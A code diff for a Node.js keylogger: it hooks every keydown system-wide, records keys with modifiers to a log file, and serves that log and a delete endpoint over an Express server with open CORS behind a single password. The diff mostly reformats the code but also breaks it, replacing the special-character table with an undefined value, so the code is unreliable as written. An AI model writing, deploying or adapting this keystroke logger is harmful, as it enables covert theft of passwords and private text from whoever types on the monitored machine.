@@ -3,34 +3,32 @@ const express = require('express');
 const config = require('./config');
 const fs = require('fs');
 const path = require('path');
-
 const app = express();
 
-const keymap = config.keymap;
-const specialchar = {"`":"~","1":"!","2":"@","3":"#","4":"$","5":"%","6":"^","7":"&","8":"*","9":"(","0":")","-":"_","=":"+","[":"{","]":"}","\\":"|",";":":","'":'"',",":"<",".":">","/":"?",}
-fs.appendFile(config.dir + '/data.log', '\n', function (err) {
-    if (err) throw err;
-  });
+const Keymap = config.Keymap;
+const SpecialCharacter =
+    fs.appendFile(config.dir + '/data.log', '\n' + ((Date()).toString()) + '\n', function (err) {
+        if (err) throw err;
+    });
 
 let toggle = false;
 
 app.use(express.static('dist'));
 app.use(express.json());
-app.use(function(req, res, next) {
+app.use(function (req, res, next) {
     res.header("Access-Control-Allow-Origin", "*");
     res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept,Authorization");
     next();
-  });
-  
-app.get('/', function(req, res, next) {
+});
+
+app.get('/', function (req, res, next) {
     res.sendFile(path.join(__dirname, './dist/index.html'));
 });
 
-
-app.post('/', function(req,res) {
-    if(req.body.password == config.password) {
-        fs.readFile(config.dir + '/data.log', (err,data) => {
-            if(err) {
+app.post('/', function (req, res) {
+    if (req.body.password == config.password) {
+        fs.readFile(config.dir + '/data.log', (err, data) => {
+            if (err) {
                 return res.status(400).send({ message: err.toString() })
             };
             return res.status(200).send({ message: data.toString() });
@@ -41,10 +39,10 @@ app.post('/', function(req,res) {
     }
 })
 
-app.post('/delete', function(req,res) {
-    if(req.body.password == config.password) {
+app.post('/delete', function (req, res) {
+    if (req.body.password == config.password) {
         fs.unlink(config.dir + '/data.log', (err) => {
-            if(err) {
+            if (err) {
                 return res.status(400).send({ message: err.toString() })
             };
             return res.status(200).send({ message: "Deleted Successfully" });
@@ -59,22 +57,22 @@ function interpret(event) {
 
     if (event.rawcode == 20) {
         toggle = !toggle;
-    } 
+    }
     else {
-        if (event.rawcode in keymap) {
-            let i = keymap[event.rawcode];
-            if(event.altKey || event.ctrlKey|| event.metaKey){
-                if(event.shiftKey)
-                i="SHIFT+"+i;
-                if(event.altKey)
-                i="ALT+"+i;
-                if(event.metaKey)
-                i="WIN+"+i;
-                if(event.ctrlKey)
-                i="CTRL+"+i;
+        if (event.rawcode in Keymap) {
+            let i = Keymap[event.rawcode];
+            if (event.altKey || event.ctrlKey || event.metaKey) {
+                if (event.shiftKey)
+                    i = "SHIFT+" + i;
+                if (event.altKey)
+                    i = "ALT+" + i;
+                if (event.metaKey)
+                    i = "WIN+" + i;
+                if (event.ctrlKey)
+                    i = "CTRL+" + i;
             }
-            else if(event.shiftKey && (i in specialchar)){
-                i=specialchar[i]
+            else if (event.shiftKey && (i in SpecialCharacter)) {
+                i = SpecialCharacter[i]
             }
             else if (toggle ^ event.shiftKey) {
                 i = i.toUpperCase();
@@ -86,14 +84,13 @@ function interpret(event) {
                 }
                 fs.appendFile(config.dir + '/data.log', i, function (err) {
                     if (err) throw err;
-                  });
-                //$$$$$$$$$$$$$$$$$$ variable 'i' is to be stored in a file without linebreak $$$$$$$$$$$$$$$$$$$$$$
+                });
             }
         }
     }
 }
 
-iohook.on('keydown',interpret);
+iohook.on('keydown', interpret);
 
 iohook.start();
 
